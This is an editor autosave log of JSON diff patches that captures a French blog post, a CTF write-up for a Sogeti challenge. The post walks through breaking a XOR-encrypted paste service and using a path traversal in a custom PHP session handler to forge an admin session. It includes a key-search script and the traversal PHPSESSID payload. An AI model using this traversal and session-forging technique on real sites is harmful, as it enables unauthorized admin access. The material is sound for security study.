{"ts":1376843687424,"silentsave":true,"restoring":false,"patch":[[]],"length":0}
{"contributors":[],"silentsave":false,"ts":1376843698790,"patch":[[{"diffs":[[1,"---\r\nlayout: post\r\ntitle: Wargame Natas - Writeup Level 15\r\ndate: 2012-11-25 20:29\r\ncomments: true\r\ncategories: hacking\r\nphoto: overthewire_logo.png\r\ndescription: La solution du level 15 du wargame Natas qui s'avère être une faille de type blind SQL injection.\r\n---"]],"start1":0,"start2":0,"length1":0,"length2":265}]],"length":265,"saved":false}
{"ts":1376843733046,"patch":[[{"diffs":[[0,"e: W"],[-1,"argame Natas - Writeup Level 15\r\ndate: 2012-11-25 20:29\r\ncomments: true\r\ncategories: hacking\r\nphoto: overthewire_logo.png\r\ndescription: La solution du level 15 du wargame Natas qui s'avère ê"],[1,"riteup challenge Sogeti\r\ndate: 2013-06-28\r\ncomments: true\r\ncategories:\r\n- hacking\r\ndescription: Un petit writeup pour le challenge réalisé à l'occasion d'un \"security event\" organisé par Sogeti.\r\nphoto: challenge_sogeti.png\r\n---\r\n\r\nDans cet article je vais décrire les étapes nécessaire à la résultion d'un challenge réalisé à l'occasion d'un \"security event\" organisé par Sogeti le 25 juin 2013.\r\n\r\nSur la page d'accueil le message suivant est présent :\r\n\r\n>Ce site web vous propose de stocker vos messages en ligne tout en les chiffrant à l'aide d'un algorithme inviolable.\r\n>Votre but est d'accéder à la zone d'administration du site, une partie du code source est aussi disponible\r\n\r\n## Un algorithme inviolable ? ##\r\n\r\nPremière étape, il va s'intéresser à cette algorithme soit disant inviolable.\r\n\r\nCode de la page *add.php* :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n\r\ninclude 'includes/init.php';\r\n\r\nif(isset($_POST['message']) && isset($_POST['password']) && strlen($_POST['password']) >= 5)\r\n{\r\n    $name_file = md5(microtime());\r\n    $cipher = cipher_it($_POST['message'], stripslashes($_POST['password']));\r\n    $f = fopen(PASTE_DIRECTORY.$name_file, 'w+');\r\n    fwrite($f, $cipher);\r\n    fclose($f);\r\n    header(\"Location: show.php?id=\".$name_file.\"&password=\".urlencode(stripslashes($_POST['password'])));\r\n    exit;\r\n}\r\n\r\n$pagename = \"add\";\r\n$title = \"Nouveau message\";\r\ninclude 'includes/header.php';\r\n?>\r\n{% endhighlight %}\r\n\r\nLa fonction utlisée pour encoder le message est *cipher_it* et prend en argument le message ainsi qu'un mot de passe pour l'encoder.\r\n\r\nCette même fonction est utilisée pour décoder le message :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n\r\ninclude 'includes/init.php';\r\n\r\nif(!isset($_GET['id']) || !isset($_GET['password']) || preg_match(\"/^[0-9a-f]{32}$/\", $_GET['id']) == false)\r\n{\r\n    header(\"Location: index.php\");\r\n    exit;\r\n}\r\n\r\nif(!is_file(PASTE_DIRECTORY.$_GET['id']))\r\n{\r\n    header(\"Location: index.php\");\r\n    exit;\r\n}\r\n\r\n$f = fopen(PASTE_DIRECTORY.$_GET['id'], \"rb\");\r\n$content = cipher_it(fread($f, filesize(PASTE_DIRECTORY.$_GET['id'])), $_GET['password']);\r\nfclose($f);\r\n\r\n$pagename = \"show\";\r\n$title = \"Voir un message\";\r\ninclude 'includes/header.php';\r\n\r\n    echo \"<fieldset class=\\\"event_form\\\" style='text-align:left;'><pre style='background:transparent;'>\".htmlspecialchars($content).\"</pre></fieldset>\";\r\n\r\ninclude 'includes/footer.php';\r\n?>\r\n{% endhighlight %}\r\n\r\nCela signifie que si l'on applique deux fois la fonction permettant d'encoder le message avec le même mot de passe, on retombe sur le message d'origine. On pense alors à la fonction *xor* souvent utilisée en crypto et qui possède cette propriété. De plus, on observe qu'il est possible d'accéder au message chiffré car la constante *PASTE_DIRECTORY* est définie dans le fichier *consts.php*.\r\n\r\n{% highlight php %}\r\n<?php\r\ndefine('PASTE_DIRECTORY', __DIR__.'/../pastes/');\r\n?>\r\n{% endhighlight %}\r\n\r\nLes fichiers seront donc accessibles à partir de cette adresse :\r\n\r\n    http://217.109.132.34/challenge/pastes/[MD5]\r\n\r\nOn va faire un petit test pour vérifier cette hypothèse. Si on chiffre le message test1 avec la clé test1 on se retrouve avec cette url :\r\n\r\n    http://217.109.132.34/challenge/show.php?id=56499aff7b85dd3778f3572b1b822176&password=test1\r\n\r\nPour accéder au message chiffré il faut se rendre à l'adresse suivante :\r\n\r\n    http://217.109.132.34/challenge/pastes/56499aff7b85dd3778f3572b1b822176\r\n\r\nQuand on ouvre le fichier avec un éditeur de texte on se retrouve avec que des zéros :\r\n\r\n    0000 0000 00\r\n\r\nC'est donc bien la fonction *xor* qui est utilisée pour chiffrer les messages. On est donc désormais en mesure de créer des fichiers sur le serveur dont on maîtrise le contenu.\r\n\r\n## Accès à la page d'administration ##\r\n\r\nL'objectif premier de ce challenge est d'accéder à la page d'administration, jeton un coup d'oeil au code source :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n\r\ninclude 'includes/init.php';\r\n\r\n$pagename = \"admin\";\r\n$title = \"Administration\";\r\ninclude 'includes/header.php';\r\n\r\nif(!isset($_SESSION['admin']) || $_SESSION['admin'] !== true)\r\n{\r\n    header(\"Location: index.php\");\r\n    exit;\r\n}\r\n\r\ndefine('ADMIN', true);\r\ninclude 'admin_ok.php';\r\n\r\ninclude 'includes/footer.php';\r\n?>\r\n{% endhighlight %}\r\n\r\nOn remarque qu'il n'est possible d'accéder à la page d'administration que si la variable de session admin est à true. Il nous faudrait donc un moyen nous permettant de manipuler la session.\r\n\r\n## Gestion des sessions ##\r\n\r\nIntéressons nous maintenant aux fichiers *init.php* et *class_session.php* :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\nclass SuperSessionHandler{\r\n    private $savePath;\r\n\r\n    public function open($savePath, $sessionName){\r\n        $this->savePath = $savePath;\r\n        if (!is_dir($this->savePath)) {\r\n            mkdir($this->savePath, 0777);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    public function close(){\r\n        return true;\r\n    }\r\n\r\n    public function read($id){\r\n        return (string)@file_get_contents(\"$this->savePath/$id\");\r\n    }\r\n\r\n    public function write($id, $data){\r\n        return file_put_contents(\"$this->savePath/$id\", $data) === false ? false : true;\r\n    }\r\n\r\n    public function destroy($id){\r\n        $file = \"$this->savePath/$id\";\r\n        if (file_exists($file)) {\r\n            unlink($file);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    public function gc($maxlifetime){\r\n        foreach (glob(\"$this->savePath/*\") as $file) {\r\n            if (filemtime($file) + $maxlifetime < time() && file_exists($file)) {\r\n                unlink($file);\r\n            }\r\n        }\r\n\r\n        return true;\r\n    }\r\n}\r\n?>\r\n{% endhighlight %}\r\n\r\n{% highlight php lineos %}\r\n<?php\r\n\r\ninclude 'includes/fonctions.php';\r\ninclude 'includes/consts.php';\r\ninclude 'includes/class_sessions.php';\r\n\r\nerror_reporting(0);\r\n\r\n$s = new SuperSessionHandler();\r\nsession_save_path(__DIR__.'/../sessions/');\r\nsession_set_save_handler (\r\n        array(&$s, 'open'),\r\n        array(&$s, 'close'),\r\n        array(&$s, 'read'),\r\n        array(&$s, 'write'),\r\n        array(&$s, 'destroy'),\r\n        array(&$s, 'gc')\r\n        );\r\nsession_start();\r\n?>\r\n{% endhighlight %}\r\n\r\nOn remarque qu'une classe a été crée permettant de redéfinir la manière dont seront stockées les sessions, les sessions sont stockée dans le dossier *sessions*. Pour accéder à la session il faut se rendre à l'adresse :\r\n\r\n    http://217.109.132.34/challenge/sessions/[PHPSESSID]\r\n\r\nSi on regarde de plus près la fonction *read*, il s'avère que le paramètre *id*n'est pas du tout contrôlé !\r\n\r\n{% highlight php %}\r\n<?php\r\n    public function read($id){\r\n        return (string)@file_get_contents(\"$this->savePath/$id\");\r\n    }\r\n?>\r\n{% endhighlight %}\r\n\r\nOn est donc en mesure de choisir le fichier qui sera utilisé comme session est modifiant le PHPSESSID.\r\n\r\n## Résolution de l'épreuve ##\r\n\r\nSi on récapitule :\r\n-   Il nous est possible de créer sur le serveur un fichier au contenu arbitraire\r\n-   Pour accéder à la page d'administration il faut modifier sa session\r\n-   On a de la chance la gestion des sessions est personnalisée\r\n\r\nOn va donc crée un message chiffré qui sera utilisé comme fichier de session afin de se faire passer pour l'admin. Le contenu du fichier de session avec la variable admin à "],[0,"tr"],[1,"u"],[0,"e "],[-1,"une faille de type blind SQL injection.\r\n---"],[1,"ressemble à ça :\r\n\r\n    admin|b:1;\r\n\r\nPour obtenir le message chiffré j'ai créé un petit script qui me génère une clé afin que le premier texte chiffré ne contienne que des caractère imprimables.\r\n\r\n{% highlight php lineos %}\r\n<?php\r\nfunction xor_this($string,$key) {\r\n // Our plaintext/ciphertext\r\n $text =$string;\r\n\r\n // Our output text\r\n $outText = '';\r\n\r\n // Iterate through each character\r\n for($i=0;$i<strlen($text);)\r\n {\r\n     for($j=0;($j<strlen($key) && $i<strlen($text));$j++,$i++)\r\n     {\r\n         $outText .= $text{$i} ^ $key{$j};\r\n         //echo 'i='.$i.', '.'j='.$j.', '.$outText{$i}.'<br />'; //for debugging\r\n     }\r\n }\r\n return $outText;\r\n}\r\n\r\nfunction generateRandomString($length = 10) {\r\n    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';\r\n    $randomString = '';\r\n    for ($i = 0; $i < $length; $i++) {\r\n        $randomString .= $characters[rand(0, strlen($characters) - 1)];\r\n    }\r\n    return $randomString;\r\n}\r\n\r\nwhile(1){\r\n    $key =generateRandomString();\r\n    if(ctype_print(xor_this('admin|b:1;',$key))){\r\n        echo $key.\"<br/>\";\r\n        echo ctype_print(xor_this('admin|b:1;',$key));\r\n        die();\r\n    }\r\n}\r\n?>\r\n{% endhighlight %}\r\n\r\nLe principe est simple je génère une chaine de caractère aléatoire de même taille que le texte à chiffrer et je vérifie que le texte obtenu en sortie est constitué uniquement de caractère imprimables avec la fonction *ctype_print*.\r\n\r\nClés qui fonctionnnent :\r\n\r\n    Y3BFOWOXlV\r\n    KYNZAPHCcC\r\n    GZV2KSEpds\r\n\r\nUne fois que l'on a la clé il suffit de chiffrer le message une première fois avec la clé, pour chiffrer à nouveau le résultat avec cette même clé.\r\n\r\n    Clé     : FJQ5VPSStf\r\n    Message : admin|b:1;\r\n    Cipher  : '.<\\8,1iE]\r\n\r\n    Clé     : FJQ5VPSStf (clé)\r\n    Message : '.<\\8,1iE] (cipher)\r\n    Cipher  : admin|b:1;\r\n\r\nOn se rend à l'adresse du message chiffré et on retrouve bien notre message d'origine\r\n\r\nIl ne reste plus qu'a changé la valeur du *PHPSESSID* pour qu'il pointe sur notre message. Pour cela j'ai utilisé l'extension \"Edit this cookie\" pour Chrome et j'ai remplacé la valeur du *PHPSESSID* par :\r\n\r\n    ../pastes/2790cdae372837fbc4347f63990bda54\r\n\r\nEt voila si l'on se rend sur la page d'administration le message affiché est désormais :\r\n\r\n>Félicitations !\r\n>Le message caché est :\r\n>Si tu es arrivé(e) jusque là c'est que tu peux aller jusqu'Issy !\r\n\r\nAu final une épreuve pas très compliquée mais intéressante :)\r\n\r\n"]],"start1":23,"start2":23,"length1":242,"length2":9750}]],"length":9773,"saved":false}
